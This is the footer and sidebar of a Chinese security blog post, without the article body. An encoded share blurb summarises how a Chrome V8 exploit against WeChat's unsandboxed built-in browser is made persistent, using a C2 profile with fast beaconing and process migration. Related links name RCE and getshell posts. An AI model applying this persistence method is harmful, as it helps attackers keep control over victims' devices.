+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" data-pjax-state="">Li qun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/" data-pjax-state="">https://www.ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ailiqun.xyz/" target="_blank">Liqun</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="https://ailiqun.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-pjax-state="">漏洞复现</a><a class="post-meta__tags" href="https://ailiqun.xyz/tags/%E5%BE%AE%E4%BF%A1rce/" data-pjax-state="">微信 rce</a></div><div class="post_share"><div class="social-share share-component" data-image="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post3.webp" data-sites="facebook,twitter,wechat,weibo,qq"><a class="social-share-icon icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Failiqun.xyz%2F2021%2F04%2F18%2F%25E8%25B0%25B7%25E6%25AD%258C%25E6%25B5%258F%25E8%25A7%2588%25E5%2599%25A8-v8-%25E5%259C%25A8%25E5%25BE%25AE%25E4%25BF%25A1%25E4%25B8%258A%25E7%259A%2584%25E5%25BA%2594%25E7%2594%25A8%2F" target="_blank"></a><a class="social-share-icon icon-twitter" href="https://twitter.com/intent/tweet?text=%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%20%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6%20%7C%20Liqun&amp;url=https%3A%2F%2Failiqun.xyz%2F2021%2F04%2F18%2F%25E8%25B0%25B7%25E6%25AD%258C%25E6%25B5%258F%25E8%25A7%2588%25E5%2599%25A8-v8-%25E5%259C%25A8%25E5%25BE%25AE%25E4%25BF%25A1%25E4%25B8%258A%25E7%259A%2584%25E5%25BA%2594%25E7%2594%25A8%2F&amp;via=https%3A%2F%2Failiqun.xyz" target="_blank"></a><pangu> </pangu><a class="social-share-icon icon-wechat" href="javascript:"><div class="wechat-qrcode"><h4>微信扫一扫：分享</h4><div class="qrcode" title="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/"><canvas width="100" height="100" style="display: none;"></canvas><img alt="Scan me!" src="data:image/png;base64,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" style="display: block;"></div><div class="help"><p>微信里点 “发现”，扫一下</p><p>二维码便可将本文分享至朋友圈。</p></div></div></a><a class="social-share-icon icon-weibo" href="http://service.weibo.com/share/share.php?url=https%3A%2F%2Failiqun.xyz%2F2021%2F04%2F18%2F%25E8%25B0%25B7%25E6%25AD%258C%25E6%25B5%258F%25E8%25A7%2588%25E5%2599%25A8-v8-%25E5%259C%25A8%25E5%25BE%25AE%25E4%25BF%25A1%25E4%25B8%258A%25E7%259A%2584%25E5%25BA%2594%25E7%2594%25A8%2F&amp;title=%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%20%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6%20%7C%20Liqun&amp;pic=https%3A%2F%2Failiqun.oss-cn-shenzhen.aliyuncs.com%2Fimg%2Fpost3.webp&amp;appkey=" target="_blank"></a><a class="social-share-icon icon-qq" href="http://connect.qq.com/widget/shareqq/index.html?url=https%3A%2F%2Failiqun.xyz%2F2021%2F04%2F18%2F%25E8%25B0%25B7%25E6%25AD%258C%25E6%25B5%258F%25E8%25A7%2588%25E5%2599%25A8-v8-%25E5%259C%25A8%25E5%25BE%25AE%25E4%25BF%25A1%25E4%25B8%258A%25E7%259A%2584%25E5%25BA%2594%25E7%2594%25A8%2F&amp;title=%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%20%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6%20%7C%20Liqun&amp;source=%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%20%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6%20%7C%20Liqun&amp;desc=%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%20%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6%E6%9C%80%E8%BF%91%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E7%88%86%E5%87%BA%E4%BA%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%A4%84%E9%83%BD%E6%98%AF%E5%B0%B1%E4%B8%8D%E8%B5%98%E8%BF%B0%E4%BA%86%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%BE%AE%E4%BF%A1%E8%B0%83%E7%94%A8%E4%BA%86%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E8%80%8C%E4%B8%94%E9%BB%98%E8%AE%A4%E6%B2%A1%E5%BC%80%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E%E4%BD%86%E6%98%AF%E7%88%86%E5%87%BA%E6%9D%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%98%AF%E4%BE%9D%E8%B5%96%E5%9C%A8%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E7%A8%8B%E4%B8%8A%E7%9A%84%EF%BC%8C%E5%AF%B9%E6%96%B9%E7%82%B9%E5%87%BB%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5%E5%90%8E%E5%8F%AF%E6%AD%A3%E5%B8%B8%E4%B8%8A%E7%BA%BF%E5%8F%AF%E6%98%AF%E4%B8%80%E6%97%A6%E5%85%B3%E9%97%AD%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%B1%E4%BC%9A%E5%A4%B1%E5%8E%BB%E6%8E%A7%E5%88%B6%E6%9D%83%E8%A7%A3%E5%86%B3%E4%B8%8A%E8%BF%B0%E9%97%AE%E9%A2%981.%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89%20malleable%20C2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%20%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%80%E4%B8%8A%E7%BA%BF%E8%B7%B3%E9%BB%98%E8%AE%A4%E4%B8%BA1%E7%A7%92%EF%BC%8C%E5%B0%B1%E5%8F%AF%E8%87%AA%E5%8A%A8%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9F%AD%E6%9A%82%E7%9A%84%E6%97%B6%E9%97%B4%E9%87%8C%E5%B0%BD%E5%BF%AB%E8%BD%AC%E7%A7%BB%E8%BF%9B%E7%A8%8B2.%E5%8A%A0%E8%BD%BD%E4%B8%80%E4%B8%AA&amp;pics=https%3A%2F%2Failiqun.oss-cn-shenzhen.aliyuncs.com%2Fimg%2Fpost3.webp" target="_blank"></a></div><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/share.min.css" media="all" onload="this.media=&#39;all&#39;"><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/social-share.min.js" defer=""></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/wechat.webp" target="_blank"><img class="post-qr-code-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/wechat.webp" alt="wechat"></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/alipay.webp" target="_blank"><img class="post-qr-code-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/alipay.webp" alt="alipay"></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="https://ailiqun.xyz/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" data-pjax-state=""><img class="prev-cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post.webp" onerror="onerror=null;src=&#39;/img/404.jpg&#39;" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">在线工具汇总</div></div></a></div><div class="next-post pull-right"><a href="https://ailiqun.xyz/2021/04/16/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/" data-pjax-state=""><img class="next-cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post5.webp" onerror="onerror=null;src=&#39;/img/404.jpg&#39;" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Web 常见漏洞描述及修复建议</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="https://ailiqun.xyz/2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="网康下一代防火墙   命令执行" data-pjax-state=""><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post7.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-13</div><div class="title">网康下一代防火墙   命令执行</div></div></a></div><div><a href="https://ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/" title="致远OA 组合getshell" data-pjax-state=""><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post5.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-10</div><div class="title">致远 OA 组合 getshell</div></div></a></div><div><a href="https://ailiqun.xyz/2021/04/10/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="亿邮电子邮件系统 命令执行" data-pjax-state=""><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post8.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-10</div><div class="title">亿邮电子邮件系统 命令执行</div></div></a></div><div><a href="https://ailiqun.xyz/2021/04/10/%E5%92%8C%E4%BF%A1%E4%B8%8B%E4%B8%80%E4%BB%A3%E4%BA%91%E6%A1%8C%E9%9D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="和信下一代云桌面 文件上传" data-pjax-state=""><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-10</div><div class="title">和信下一代云桌面 文件上传</div></div></a></div><div><a href="https://ailiqun.xyz/2021/02/03/Apache-Druid-CVE-2021-25646-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="Apache Druid CVE-2021-25646 " data-pjax-state=""><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post5.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-03</div><div class="title">Apache Druid CVE-2021-25646 </div></div></a></div><div><a href="https://ailiqun.xyz/2021/02/03/%E9%94%90%E6%8D%B7%E7%BD%91%E5%85%B3RCE/" title="锐捷网关RCE " data-pjax-state=""><img class="cover" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post4.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-03</div><div class="title">锐捷网关 RCE </div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment v" id="vcomment" data-class="v"><div class="vpanel"><div class="vwrap"><p class="cancel-reply text-right" style="display:none;" title="取消回复"><svg class="vicon cancel-reply-btn" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4220" width="22" height="22"><path d="M796.454 985H227.545c-50.183 0-97.481-19.662-133.183-55.363-35.7-35.701-55.362-83-55.362-133.183V227.545c0-50.183 19.662-97.481 55.363-133.183 35.701-35.7 83-55.362 133.182-55.362h568.909c50.183 0 97.481 19.662 133.183 55.363 35.701 35.702 55.363 83 55.363 133.183v568.909c0 50.183-19.662 97.481-55.363 133.183S846.637 985 796.454 985zM227.545 91C152.254 91 91 152.254 91 227.545v568.909C91 871.746 152.254 933 227.545 933h568.909C871.746 933 933 871.746 933 796.454V227.545C933 152.254 871.746 91 796.454 91H227.545z" p-id="4221"></path><path d="M568.569 512l170.267-170.267c15.556-15.556 15.556-41.012 0-56.569s-41.012-15.556-56.569 0L512 455.431 341.733 285.165c-15.556-15.556-41.012-15.556-56.569 0s-15.556 41.012 0 56.569L455.431 512 285.165 682.267c-15.556 15.556-15.556 41.012 0 56.569 15.556 15.556 41.012 15.556 56.569 0L512 568.569l170.267 170.267c15.556 15.556 41.012 15.556 56.569 0 15.556-15.556 15.556-41.012 0-56.569L568.569 512z" p-id="4222"></path></svg></p><div class="vheader item3"><input name="nick" placeholder="昵称" class="vnick vinput" type="text"><input name="mail" placeholder="邮箱" class="vmail vinput" type="email"><input name="link" placeholder="网址(http://)" class="vlink vinput" type="text"></div><div class="vedit"><textarea id="veditor" class="veditor vinput" placeholder="说点什么吗"></textarea><div class="vrow"><div class="vcol vcol-60 status-bar"></div><div class="vcol vcol-40 vctrl text-right"><span title="表情" class="vicon vemoji-btn"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="16172" width="22" height="22"><path d="M512 1024a512 512 0 1 1 512-512 512 512 0 0 1-512 512zM512 56.888889a455.111111 455.111111 0 1 0 455.111111 455.111111 455.111111 455.111111 0 0 0-455.111111-455.111111zM312.888889 512A85.333333 85.333333 0 1 1 398.222222 426.666667 85.333333 85.333333 0 0 1 312.888889 512z" p-id="16173"></path><path d="M512 768A142.222222 142.222222 0 0 1 369.777778 625.777778a28.444444 28.444444 0 0 1 56.888889 0 85.333333 85.333333 0 0 0 170.666666 0 28.444444 28.444444 0 0 1 56.888889 0A142.222222 142.222222 0 0 1 512 768z" p-id="16174"></path><path d="M782.222222 391.964444l-113.777778 59.733334a29.013333 29.013333 0 0 1-38.684444-10.808889 28.444444 28.444444 0 0 1 10.24-38.684445l113.777778-56.888888a28.444444 28.444444 0 0 1 38.684444 10.24 28.444444 28.444444 0 0 1-10.24 36.408888z" p-id="16175"></path><path d="M640.568889 451.697778l113.777778 56.888889a27.875556 27.875556 0 0 0 38.684444-10.24 27.875556 27.875556 0 0 0-10.24-38.684445l-113.777778-56.888889a28.444444 28.444444 0 0 0-38.684444 10.808889 28.444444 28.444444 0 0 0 10.24 38.115556z" p-id="16176"></path></svg></span><span title="预览" class="vicon vpreview-btn"><svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="17688" width="22" height="22"><path d="M502.390154 935.384615a29.538462 29.538462 0 1 1 0 59.076923H141.430154C79.911385 994.461538 29.538462 946.254769 29.538462 886.153846V137.846154C29.538462 77.745231 79.950769 29.538462 141.390769 29.538462h741.218462c61.44 0 111.852308 48.206769 111.852307 108.307692v300.268308a29.538462 29.538462 0 1 1-59.076923 0V137.846154c0-26.899692-23.355077-49.230769-52.775384-49.230769H141.390769c-29.420308 0-52.775385 22.331077-52.775384 49.230769v748.307692c0 26.899692 23.355077 49.230769 52.775384 49.230769h360.999385z" p-id="17689"></path><path d="M196.923077 216.615385m29.538461 0l374.153847 0q29.538462 0 29.538461 29.538461l0 0q0 29.538462-29.538461 29.538462l-374.153847 0q-29.538462 0-29.538461-29.538462l0 0q0-29.538462 29.538461-29.538461Z" p-id="17690"></path><path d="M649.846154 846.769231a216.615385 216.615385 0 1 0 0-433.230769 216.615385 216.615385 0 0 0 0 433.230769z m0 59.076923a275.692308 275.692308 0 1 1 0-551.384616 275.692308 275.692308 0 0 1 0 551.384616z" p-id="17691"></path><path d="M807.398383 829.479768m20.886847-20.886846l0 0q20.886846-20.886846 41.773692 0l125.321079 125.321079q20.886846 20.886846 0 41.773693l0 0q-20.886846 20.886846-41.773693 0l-125.321078-125.321079q-20.886846-20.886846 0-41.773693Z" p-id="17692"></path></svg></span></div></div></div><div class="vrow"><div class="vcol vcol-30"><a alt="Markdown is supported" href="https://guides.github.com/features/mastering-markdown/" class="vicon" target="_blank"><svg class="markdown" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z"></path></svg></a></div><div class="vcol vcol-70 text-right"><button type="button" title="Cmd|Ctrl+Enter" class="vsubmit vbtn">提交</button></div></div><div class="vemojis" style="display:none;"></div><div class="vinput vpreview" style="display:none;"></div><div style="display:none;" class="vmark"></div></div></div><div class="vcount" style="display:none;"><span class="vnum">0</span> 评论</div><div class="vload-top text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vcards"></div><div class="vload-bottom text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vempty" style="display: block;">来发评论吧～</div><div class="vpage txt-center" style="display:none"><button type="button" class="vmore vbtn">加载更多...</button></div><div class="vpower txt-right">Powered By <a href="https://valine.js.org/" target="_blank">Valine</a><br>v1.4.14</div></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img entered loaded" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/txx.webp" onerror="this.onerror=null;this.src=&#39;/img/friend_404.gif&#39;" alt="avatar" data-ll-status="loaded" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/txx.webp"><div class="author-info__name">Li qun</div><div class="author-info__description">ailiqun.xyz@gmail.com</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="https://ailiqun.xyz/archives/" data-pjax-state=""><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="card-info-data-item is-center"><a href="https://ailiqun.xyz/tags/" data-pjax-state=""><div class="headline">标签</div><div class="length-num">36</div></a></div><div class="card-info-data-item is-center"><a href="https://ailiqun.xyz/categories/" data-pjax-state=""><div class="headline">分类</div><div class="length-num">8</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ailiqun.xyz@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">你总是来去如风 <img class="entered exited" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/xx.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content" progress-percentage="22"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8-%E8%BE%BE%E5%88%B0%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6" data-pjax-state=""><span class="toc-number">1.</span> <span class="toc-text"> 关于微信内置浏览器 达到持久控制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 